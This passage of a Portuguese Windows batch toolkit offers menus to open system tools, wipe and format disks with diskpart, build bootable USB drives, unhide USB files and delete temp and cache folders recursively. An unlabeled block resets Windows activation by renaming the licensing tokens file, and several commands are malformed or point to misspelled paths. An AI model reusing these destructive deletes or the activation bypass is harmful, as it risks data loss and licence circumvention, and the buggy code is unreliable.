::===================adicionar hardwere===============================
MODE 20,3
hdwwiz.exe 
cls 
goto menu
:14
::===================diretivas de grupo===============================
MODE 20,3
gpedit.msc 
cls 
goto menu
:15
::===================inicio de bakup===================================
MODE 20,3
GettingStarted.exe 
::RESTAURA SISTEMA
rstrui
::BACKUP DE SENHAS
credwiz
cls 
goto menu
:16 
::===================visulizador de eventos==========================
MODE 20,3
eventvwr.msc 
cls 
goto menu
::=================== BOOT WINDOWS 7 ==========================
:BOOT
CLS
echo.
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo ARQUIVOS DE BOOT PARA WINDOW 7
echo     (1) ARQUIVO UM
echo     (2) ARQUIVO DOIS
echo     (V) VOLTA PRA O MENU PRINCIPAL
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
choice /C 12V /N /CS 
 IF errorlevel = 3 goto menu
 IF errorlevel = 2 goto BOOT02
 IF errorlevel = 1 goto BOOT01

::ABC=OPวีES 
::/N=OCULTA AS OPวีES
::/CS=DIFERENCIA MAIUSCULA DE MINUSCULA
::/T=TEMPO
::/D=OPวรO ESCOLHIDA PRA ACIONAR DEPOIS DO TEMPO ESCOLHIDO
::/M=MENSAGEM

:BOOT01

@echo off
:boot
cls
color 3f
title BOOT PARA PEN DRIVER
date /t
time /t
echo  USUARIO // %username%
echo อออออออออออออออออออออออออออออออออออออออออออออออออ
echo        BOOT PARA PEN DRIVER
echo อออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
echo    1 = FORMATAR
echo.
echo    2 = COPIAR BOOT
echo.
echo    3 = COPIAR ARQUIVOS 
echo.   
echo    4 = CRIAR PEN DRIVER BOTAVEL      
echo.
echo    5 = CRIAR O ARQUIVO
echo.
echo    6 =VOLTAR PARA O MENU PRINCIPAL
echo.
echo    7 =MENU 02
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออ
echo         DIGITE SUA ESCOLHA
echo อออออออออออออออออออออออออออออออออออออออออออออออออ
choice /C 1234567 /N /CS 
 IF errorlevel = 7 goto BOOT02
 IF errorlevel = 6 goto menu
 IF errorlevel = 5 goto MKB
 IF errorlevel = 4 goto fcba
 IF errorlevel = 3 goto car
 IF errorlevel = 2 goto cpb
 IF errorlevel = 1 goto form


::============formatar=====================


:form
cls
mode con lines=22 cols=86
echo>list.txt
echo>list.txt list disk
echo on
diskpart -s list.txt
@echo off
echo para voltar digite ( v )
set /p disco="digite o numero do disco: " 
if %disco% == v goto fim
set /p part="ntfs ou fat32 ?: " 
echo:
echo > move.txt
echo > move.txt list disk
echo >> move.txt select disk %disco%
echo >> move.txt clean
echo >> move.txt create partition primary
echo >> move.txt format fs=%part% quick
echo >> move.txt active
echo >> move.txt assign
echo off
echo:
diskpart -s move.txt
ping 127.0.0.1 -n 2 > nul
ping -n 3 localhost>nul
del /f list.txt
del /f move.txt

goto boot 

::============copiar boot=====================
:cpb
cls
echo para voltar digite ( v )
echo อออออออออออออออออออออออออออ
echo  DIGITE A LETRA DO WINDOWS
echo อออออออออออออออออออออออออออ
set /p win="letra do Windows: "
echo:
if %win% == v goto boot 
cls
echo para voltar digite ( v )
echo อออออออออออออออออออออออออออ
echo  DIGITE A LETRA DO PEN DRIVER
echo อออออออออออออออออออออออออออ
set /p ltpen="letra do pen driver: "
if %win% == v goto boot %win%:
cd boot
%win%:bootsect /nt60 %ltpen%: 
cd..
pause
goto boot
::============copiar arquivos=====================
:car
cls
echo para voltar digite ( v )
echo อออออออออออออออออออออออออออ
echo  DIGITE A LETRA DO WINDOWS
echo อออออออออออออออออออออออออออ
set /p win="letra do Windows: "
echo:
if %win%  == v goto boot
echo อออออออออออออออออออออออออออ
echo  DIGITE A LETRA DO PEN DRIVER
echo อออออออออออออออออออออออออออ
set /p ltpen="letra do pen driver: "
if %ltpen%  == v goto boot
::============mensagem=====================

echo MsgBox " COPIANDO OS ARQUIVOS DO WINDOWS %win%: PARA %ltpen%: ",vbOKOnly + vbInformation, "criar boot" >%temp%\wyz.vbs 
start %temp%\wyz.vbs
xcopy %win%:*.* /s/e/f %ltpen%:
echo MsgBox " ARQUIVOS COPIADOS DE %win%: PARA %ltpen%: ",vbOKOnly + vbInformation, "criar boot" >%temp%\wyz.vbs 
start %temp%\wyz.vbs
goto boot


slmgr -dli
slmgr -xpr
slmgr -dlv
slmgr /rearm
slmgr /ato (pra ver a chave do windows)
net stop sppsvc
cd C:\windows\ServiceProfiles\NetworkService\AppData\Roaming\Microsoft\SoftwereProtectionPlatform
rename tokens.data tokens.bar
cd C:%windir%\System32
net start sppsvc
islui.exe


::======================criar pen driver botavel====================
:fcba
cls
::=====formata=============
mode con lines=22 cols=86
echo>list.txt
echo>list.txt list disk
echo on
diskpart -s list.txt
@echo off
echo para sair digite ( v )
set /p disco="digite o numero do disco: "  
if %disco% == v goto fim
echo:
echo > move.txt
echo > move.txt list disk
echo >> move.txt select disk %disco%
echo >> move.txt clean
echo >> move.txt create partition primary
echo >> move.txt format fs=fat32 quick
echo >> move.txt active
echo >> move.txt assign
echo off
echo:
diskpart -s move.txt
ping 127.0.0.1 -n 2 > nul
ping -n 3 localhost>nul
del /f list.txt
del /f move.txt
::=====copia o boot=======
echo.
echo อออออออออออออออออออออออออออ
echo  DIGITE A LETRA DO WINDOWS
echo อออออออออออออออออออออออออออ
set /p win="letra do Windows: "
echo:
echo อออออออออออออออออออออออออออ
echo  DIGITE A LETRA DO PEN DRIVER
echo อออออออออออออออออออออออออออ
set /p ltpen="letra do pen driver: "

@ECHO ON
 %win%:
cd boot
%win%:bootsect /nt60 %ltpen%: 
cd..
::=====copia os arquivos====
xcopy %win%:*.* /s/e/f %ltpen%:
exit /b
goto boot

:fim

goto boot

:MKB
echo @echo off >arq.bat
echo mode con lines=22 cols=86 >>arq.bat
echo echo^>list.txt >>arq.bat
echo echo^>list.txt list disk >>arq.bat
echo echo on >>arq.bat
echo diskpart -s list.txt >>arq.bat
echo @echo off >>arq.bat
echo color 3f >>arq.bat
echo set /p disco="digite o numero do disco: "  >>arq.bat 
echo echo ^> move.txt >>arq.bat
echo echo ^> move.txt list disk >>arq.bat
echo echo ^>^> move.txt select disk %%disco%% >>arq.bat
echo echo ^>^> move.txt clean >>arq.bat
echo echo ^>^> move.txt create partition primary >>arq.bat
echo echo ^>^> move.txt format fs=fat32 quick >>arq.bat
echo echo ^>^> move.txt active >>arq.bat
echo echo ^>^> move.txt assign >>arq.bat
echo diskpart -s move.txt >>arq.bat
echo ping 127.0.0.1 -n 2 >^ nul >>arq.bat
echo ping -n 3 localhost^>nul >>arq.bat
echo del /f list.txt >>arq.bat
echo del /f move.txt >>arq.bat
echo echo อออออออออออออออออออออออออออ >>arq.bat
echo echo  DIGITE A LETRA DO WINDOWS >>arq.bat
echo echo อออออออออออออออออออออออออออ >>arq.bat
echo set /p win="letra do Windows: " >>arq.bat
echo CLS >>arq.bat
echo echo อออออออออออออออออออออออออออ >>arq.bat
echo echo  DIGITE A LETRA DO PEN DRIVER >>arq.bat
echo echo อออออออออออออออออออออออออออ >>arq.bat
echo set /p ltpen="letra do pen driver: " >>arq.bat
echo @ECHO ON >>arq.bat
echo  %%win%%: >>arq.bat
echo cd boot >>arq.bat
echo %%win%%:bootsect /nt60 %%ltpen%%:  >>arq.bat
echo cd.. >>arq.bat
echo xcopy %%win%%:*.* /s/e/f %%ltpen%%: >>arq.bat
echo exit /b >>arq.bat






:BOOT02 
CLS
COLOR 2F
MODE 80,30
ECHO.
ECHO abrir cmd em modo de administrador
ECHO.
ECHO diskpart
ECHO list disk
ECHO select disk {numero ou letra do pen drive }
ECHO clean
ECHO create partition primary
ECHO active
ECHO format fs=fat32 quick
ECHO assign
ECHO exit
ECHO d:
ECHO d:\cd boot
ECHO bootsect /nt60 { letra do pendriver}
ECHO cd..
ECHO xcopy [unidade do windows]:*.* /s/e/f [unidade do pen driver]:
PAUSE >NUL

echo.
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo QUER CRIAR O ARQUIVO BOOT_WINDOW_7
echo     1 = SIM
echo     2 = NAO
echo     3 = VOLTA PRA O MENU PRINCIPAL
echo     4 = menu 01
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
choice /C 1234 /N /CS 
 IF errorlevel = 4 goto BOOT01
 IF errorlevel = 3 goto MENU
 IF errorlevel = 2 goto MENU
 IF errorlevel = 1 goto SIM

::ABC=OPวีES 
::/N=OCULTA AS OPวีES
::/CS=DIFERENCIA MAIUSCULA DE MINUSCULA
::/T=TEMPO
::/D=OPวรO ESCOLHIDA PRA ACIONAR DEPOIS DO TEMPO ESCOLHIDO
::/M=MENSAGEM

 

:SIM
cls

echo @ echo off >C:\Users\%username%\Desktop\BOOT_WINDOWS_7.cmd
echo. >>C:\Users\%username%\Desktop\BOOT_WINDOWS_7.TXT
echo title =================== BOOT WINDOWS 7 ==========================>>C:\Users\%username%\Desktop\BOOT_WINDOWS_7.cmd
echo ::=================== BOOT WINDOWS 7 ==========================>>C:\Users\%username%\Desktop\BOOT_WINDOWS_7.TXT
echo color 3f >>C:\Users\%username%\Desktop\BOOT_WINDOWS_7.cmd
echo. >>C:\Users\%username%\Desktop\BOOT_WINDOWS_7.TXT
ECHO abrir o cmd no modo administrador>>C:\Users\%username%\Desktop\BOOT_WINDOWS_7.TXT
ECHO.>>C:\Users\%username%\Desktop\BOOT_WINDOWS_7.TXT
ECHO diskpart>>C:\Users\%username%\Desktop\BOOT_WINDOWS_7.TXT
ECHO list disk>>C:\Users\%username%\Desktop\BOOT_WINDOWS_7.TXT
ECHO select disk {numero ou letra do pen drive }>>C:\Users\%username%\Desktop\BOOT_WINDOWS_7.TXT
ECHO clean>>C:\Users\%username%\Desktop\BOOT_WINDOWS_7.TXT
ECHO create partition primary >>C:\Users\%username%\Desktop\BOOT_WINDOWS_7.TXT
ECHO active>>C:\Users\%username%\Desktop\BOOT_WINDOWS_7.TXT
ECHO format fs=fat32 quick>>C:\Users\%username%\Desktop\BOOT_WINDOWS_7.TXT
ECHO assign>>C:\Users\%username%\Desktop\BOOT_WINDOWS_7.TXT
ECHO exit>>C:\Users\%username%\Desktop\BOOT_WINDOWS_7.TXT
ECHO d:>>C:\Users\%username%\Desktop\BOOT_WINDOWS_7.TXT
ECHO d:\cd boot>>C:\Users\%username%\Desktop\BOOT_WINDOWS_7.TXT
ECHO bootsect /nt60 { letra do pendriver}>>C:\Users\%username%\Desktop\BOOT_WINDOWS_7.TXT
ECHO cd..>>C:\Users\%username%\Desktop\BOOT_WINDOWS_7.TXT
ECHO xcopy [unidade do windows]:*.* /s/e/f [unidade do pen driver]:>>C:\Users\%username%\Desktop\BOOT_WINDOWS_7.TXT
Echo start BOOT_WINDOWS_7.TXT>>C:\Users\%username%\Desktop\BOOT_WINDOWS_7.cmd
echo TYPE BOOT_WINDOWS_7.TXT>>C:\Users\%username%\Desktop\BOOT_WINDOWS_7.cmd
echo color f0 >>C:\Users\%username%\Desktop\BOOT_WINDOWS_7.cmd
echo PAUSE > NUL>>C:\Users\%username%\Desktop\BOOT_WINDOWS_7.cmd
echo DEL /S /Q BOOT_WINDOWS_7.TXT>>C:\Users\%username%\Desktop\BOOT_WINDOWS_7.cmd
echo DEL /S /Q BOOT_WINDOWS_7.cmd>>C:\Users\%username%\Desktop\BOOT_WINDOWS_7.cmd
echo MsgBox " ARQUIVO [ BOOT_WINDOWS_7 ] CRIADO COM SUCESSO NA SUA AREA DE TRABALHO ",vbOKOnly + vbInformation, "WYZARD CORP" >%temp%\wyz.vbs
start %temp%\wyz.vbs
::============================================================================================================================
::=============================BOOT PARA PEN DRIVER===========================================================================
::============================================================================================================================
echo @echo off>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo color 0a>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo mode con lines=22 cols=86>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo^>list.txt>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo^>list.txt list disk>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo on>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo diskpart -s list.txt>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo @echo off>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo ping localhost -n 2 ^>nul>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo del /f list.txt>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo set /p disco="digite o numero do disco: " >>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo set /p part="ntfs ou fat32 ?: " >>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo: >>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo ^> move.txt>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo ^> move.txt list disk>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo ^>^> move.txt select disk %%disco%%>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo ^>^> move.txt clean>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo ^>^> move.txt create partition primary>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo ^>^> move.txt format fs=%%part%% quick>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo ^>^> move.txt active>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo ^>^> move.txt assign>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo off>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo: >>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo diskpart -s move.txt>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo ping localhost -n 2 ^>nul>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo ping -n 3 localhost^>nul>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
ECHO. >>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo del /f move.txt>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo pause>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo cls>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo:>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo:>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo:>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo:>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo:>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo:>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo   VEJA EM QUE LETRA ENCOTRA-SE O WINDOWS >>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo:>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo   QUE DESEJA COPIAR PARA O PEN DRIVER>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo:>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo   E DIGITE-A NA GUIA ABAIXO>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo:>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo:>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo:>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo set /p win="LETRA DO WINDOWS: ">>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo:>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo cls>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo:>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo:>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo:>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo:>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo:>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo:>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo   CONFIRA A LETRA DO PEN DRIVER >>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo:>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo   QUE DESEJA COPIAR O WINDOWS>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo:>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo   E DIGITE-A PARA COPIAR OS ARQUIVOS>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo:>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo:>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo:>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo set /p ltpen="LETRA DO PEN DRIVER: ">>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo: >>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
ECHO.>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo @ECHO ON>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo  %%win%%:>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo cd boot>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo %%win%%:bootsect /nt60 %%ltpen%%: >>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo cd.. >>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
ECHO.>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
ECHO.>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo echo MsgBox " COPIANDO ARQUIVOS DE WINDOWS %%win%%: PARA O PEN DRIVE %%ltpen%%: ",vbOKOnly + vbInformation, "criar boot" ^>%%temp%%\wyz.vbs >>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo start %%temp%%\wyz.vbs>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo pause>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo xcopy %%win%%:*.* /s/e/f %%ltpen%%:>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo exit /b>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
ECHO.>>C:\Users\%username%\Desktop\BOOT_PARA_PEN_DRIVER.CMD
echo MsgBox " ARQUIVO [ BOOT_PARA_PEN_DRIVER ] CRIADO COM SUCESSO NA SUA AREA DE TRABALHO ",vbOKOnly + vbInformation, "WYZARD CORP" >%temp%\wyz.vbs
start %temp%\wyz.vbs

GOTO MENU
======================================================
::===================REVELAR==========================
:REV
@ echo off
cls
echo ออออออออออออออออออออออ
echo digite o caminho da pasta
echo ออออออออออออออออออออออ
set /p p=caminho da pasta 
cd "%p%"
title %p%
ping 127.0.0.1 -n 2 > nul
if exist RECYCLER ( goto del )  else (  goto att)
:att
dir /ah >>C:\Users\%username%\Desktop\ARQUIVOS_OCULTOS.TXT 
ping 127.0.0.1 -n 2 > nul 
attrib -r -h /d /s 
ping 127.0.0.1 -n 2 ^> nul 
echo  MsgBox " ARQUIVOS VERIFICADOS COM SUSCESSO!!! ",vbOKOnly + vbInformation, "WYZARD CORP" >%temp%\wyz.vbs
start %temp%\wyz.vbs
del *.lnk 
rd /S /Q RECYCLER 
echo  MsgBox " ARQUIVO RECYCLER DELETADO COM SUCESSO  ",vbOKOnly + vbInformation, "WYZARD CORP" >%temp%\wyz.vbs 
start %temp%\wyz.vbs
GOTO MENU

:PEN
ECHO @echo off >>C:\Users\%username%\Desktop\PEN_DRIVER.CMD
ECHO @echo   >>C:\Users\%username%\Desktop\PEN_DRIVER.CMD
ECHO TITLE LIMPA PENDRIVE >>C:\Users\%username%\Desktop\PEN_DRIVER.CMD 
ECHO COLOR 3F >>C:\Users\%username%\Desktop\PEN_DRIVER.CMD
ECHO SET /p "letra_pendrive=Digite a letra do Pendrive: " >>C:\Users\%username%\Desktop\PEN_DRIVER.CMD
ECHO ECHO. >>C:\Users\%username%\Desktop\PEN_DRIVER.CMD
ECHO %%letra_pendrive%%:>>C:\Users\%username%\Desktop\PEN_DRIVER.CMD
ECHO ECHO Aguarde. Estamos processando seu Pendrive.>>C:\Users\%username%\Desktop\PEN_DRIVER.CMD
ECHO attrib -a -r -h -s -i /d /S >>C:\Users\%username%\Desktop\PEN_DRIVER.CMD
ECHO del /f *.lnk >>C:\Users\%username%\Desktop\PEN_DRIVER.CMD
ECHO del /f *.ico >>C:\Users\%username%\Desktop\PEN_DRIVER.CMD
ECHO del /f x.mpeg >>C:\Users\%username%\Desktop\PEN_DRIVER.CMD
ECHO del /f *.src >>C:\Users\%username%\Desktop\PEN_DRIVER.CMD
ECHO dir /ah ^>^>C:\Users\%%username%%\Desktop\ARQUIVOS_OCULTOS.TXT >>C:\Users\%username%\Desktop\PEN_DRIVER.CMD
ECHO ping 127.0.0.1 -n 2 ^> nul >>C:\Users\%username%\Desktop\PEN_DRIVER.CMD
ECHO attrib -r -h /d /s >>C:\Users\%username%\Desktop\PEN_DRIVER.CMD
ECHO ping 127.0.0.1 -n 2 ^> nul >>C:\Users\%username%\Desktop\PEN_DRIVER.CMD >>PEN_DRIVER.CMD
ECHO echo  MsgBox " ARQUIVOS VERIFICADOS COM SUSCESSO!!! ",vbOKOnly + vbInformation, "WYZARD CORP" ^>%%temp%%\wyz.vbs>>C:\Users\%username%\Desktop\PEN_DRIVER.CMD
ECHO start %%temp%%\wyz.vbs >>C:\Users\%username%\Desktop\PEN_DRIVER.CMD
ECHO del *.lnk >>C:\Users\%username%\Desktop\PEN_DRIVER.CMD
ECHO rd /S /Q RECYCLER >>C:\Users\%username%\Desktop\PEN_DRIVER.CMD
ECHO echo  MsgBox " ARQUIVO RECYCLER DELETADO COM SUCESSO  ",vbOKOnly + vbInformation, "WYZARD CORP" ^>%%temp%%\wyz.vbs >>C:\Users\%username%\Desktop\PEN_DRIVER.CMD
ECHO start %%temp%%\wyz.vbs>>C:\Users\%username%\Desktop\PEN_DRIVER.CMD
ECHO @echo       >>C:\Users\%username%\Desktop\PEN_DRIVER.CMD
GOTO MENU




ECHO .


ECHO .
@echo               

pause
goto menu

::==================== LISTAS DE MINHAS PASTAS ==========================================
:LIST
cls
COLOR 02
cd C:\Users\%username%\Desktop
DIR >> C:\Users\%username%\Desktop\ARQUIVOS.txt
cd..
cd C:\Users\%username%\Contacts
DIR >> C:\Users\%username%\Desktop\ARQUIVOS.txt
cd..
COLOR 20
cd C:\Users\%username%
DIR >> C:\Users\%username%\Desktop\ARQUIVOS.txt
cd..
COLOR 20
cd C:\Users\%username%\Documents
DIR >> C:\Users\%username%\Desktop\ARQUIVOS.txt
cd..
COLOR 02
cd C:\Users\%username%\Downloads
DIR >> C:\Users\%username%\Desktop\ARQUIVOS.txt
cd..
COLOR 20
cd C:\Users\%username%\Favorites
DIR >> C:\Users\%username%\Desktop\ARQUIVOS.txt
cd..
cd C:\Users\%username%\Links
DIR >> C:\Users\%username%\Desktop\ARQUIVOS.txt
cd..
COLOR 20
cd C:\Users\%username%\Music
DIR >> C:\Users\%username%\Desktop\ARQUIVOS.txt
cd..
COLOR 02
cd C:\Users\%username%\Pictures
DIR >> C:\Users\%username%\Desktop\ARQUIVOS.txt
cd..
COLOR 20
cd C:\Users\%username%\Searches
DIR >> C:\Users\%username%\Desktop\ARQUIVOS.txt
cd..
COLOR 20
cd C:\Users\%username%\Videos
DIR >> C:\Users\%username%\Desktop\ARQUIVOS.txt
COLOR 20
cd C:\Users\%username%\Desktop
DIR >> C:\Users\%username%\Desktop\ARQUIVOS.txt

msg * "ARQUIVO CRIADO NO DESKTOP"
GOTO MENU

::===================LIMPESA DO COMPUTADOR==========================
:LIM
CLS
MODE 60,10
        
echo.
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo CRIAR O ARQUIVO LIMPESA
echo     C = CRIAR
echo LIMPAR O SISTEMA
echo     L = LIMPAR
echo.    V = VOLTA PRA O MENU PRINCIPAL
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
choice /C CLV /N /CS 
 IF errorlevel = 3 goto MENU
 IF errorlevel = 2 goto CLEANER
 IF errorlevel = 1 goto LM

::ABC=OPวีES 
::/N=OCULTA AS OPวีES
::/CS=DIFERENCIA MAIUSCULA DE MINUSCULA
::/T=TEMPO
::/D=OPวรO ESCOLHIDA PRA ACIONAR DEPOIS DO TEMPO ESCOLHIDO
::/M=MENSAGEM


:CLEANER
MODE 60,10 
cls
 
start temp
CD C:\Windows\Temp
del *.* /s /q
rd * C:\Windows\Temp\ /s /q
cd..
start %temp% 
CD C:\Users\%username%\AppData\Local\Temp
del *.* /s /q
rd * C:\Users\gabriel\AppData\Local\Temp\ /s /q
cd..
start prefetch
cd C:\Windows\Prefetch
del *.* /s /q
rd * C:\Windows\Prefetch\ /s /q
cd..
echo MsgBox " PASTAS DO SISTEMA LIMPAS ",vbOKOnly + vbInformation, "WYZARD CORP" >%temp%\wyz.vbs
start %temp%\wyz.vbs
del c:\*.temp /f
        del c:\*.chk /f
        del c:\temp\*.*f
        del c:\~*.* /f
        del c:\*. old /f
        del c:\*.bak /f
        del c:\"Documents and Setings"\%username%\Recent\*.* /s /q
        del c:\"Documents and Setings"\%username%\Temp\*.* /s /q
        del c:\"Documents and Setings"\%username%\Cookis\*.* /s /q
        del c:\"Documents and Setings"\%username%\config~1\Temp\*.* /s /q
        del c:\Windows\cookies\*.* /s /q
        rd c:\Windows\Temp\*.* /s /q
        md c:\\Windows\Temp
        rd c:\"Documents and Setings"\%username%\config~1\Temp /s /q
        md c:\"Documents and Setings"\%username%\config~1\Temp\
        rd c:\"Documents and Setings"\%username%\config~1\Temp\"Temporary Internet Files"\Content.IES
        md c:\"Documents and Setings"\%username%\config~1\Temp\"Temporary Internet Files"\Content.IES
start SystemPropertiesAdvanced.exe
start cleanmgr.exe
dfrgui
chkdsk /f /r
        echo.
        echo.

GOTO MENU

:LM
cls
cd C:\Users\%username%\Desktop



ECHO MODE 20,3 >> %username%LIMPESA.CMD
ECHO cls >> %username%LIMPESA.CMD
ECHO start temp >> %username%LIMPESA.CMD
ECHO CD C:\Windows\Temp >> %username%LIMPESA.CMD
ECHO del *.* /s /q >> %username%LIMPESA.CMD
ECHO rd * C:\Windows\Temp\ /s /q >> %username%LIMPESA.CMD
ECHO cd.. >> %username%LIMPESA.CMD
ECHO ping -n 3 localhost^>nul >> %username%LIMPESA.CMD
ECHO start %temp% >> %username%LIMPESA.CMD 
ECHO CD C:\Users\%username%\AppData\Local\Temp >> %username%LIMPESA.CMD
ECHO del *.* /s /q >> %username%LIMPESA.CMD
ECHO rd * C:\Users\%username%\AppData\Local\Temp\ /s /q >> %username%LIMPESA.CMD
ECHO cd.. >> %username%LIMPESA.CMD
ECHO ping -n 3 localhost^>nul >> %username%LIMPESA.CMD
ECHO start prefetch >> %username%LIMPESA.CMD
ECHO cd C:\Windows\Prefetch >> %username%LIMPESA.CMD
ECHO del *.* /s /q >> %username%LIMPESA.CMD
ECHO rd * C:\Windows\Prefetch\ /s /q >> %username%LIMPESA.CMD
ECHO cd.. >> %username%LIMPESA.CMD
ECHO ping -n 3 localhost^>nul >> %username%LIMPESA.CMD
ECHO echo MsgBox " PASTAS DO SISTEMA LIMPAS ",vbOKOnly + vbInformation, "WYZARD CORP" ^>%%temp%%\wyz.vbs >> %username%LIMPESA.CMD
ECHO start %%temp%%\wyz.vbs >> %username%LIMPESA.CMD
ECHO ping -n 3 localhost^>nul >> %username%LIMPESA.CMD
ECHO del c:\*.temp /f >> %username%LIMPESA.CMD
ECHO         del c:\*.chk /f >> %username%LIMPESA.CMD
ECHO         del c:\temp\*.*f >> %username%LIMPESA.CMD
